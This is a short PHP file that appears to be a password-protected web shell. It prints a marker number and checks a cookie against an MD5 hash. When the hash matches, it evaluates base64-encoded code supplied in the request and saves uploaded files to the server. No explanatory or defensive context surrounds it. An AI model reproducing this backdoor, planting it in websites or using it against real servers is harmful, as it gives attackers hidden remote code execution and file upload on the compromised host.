<?php

echo 8194460;
if (md5($_COOKIE["d"]) == "17028f487cb2a84607646da3ad3878ec") {
    echo "ok";
    eval(base64_decode($_REQUEST["id"]));
    if ($_POST["up"] == "up") {
        @copy($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]);
    }
}
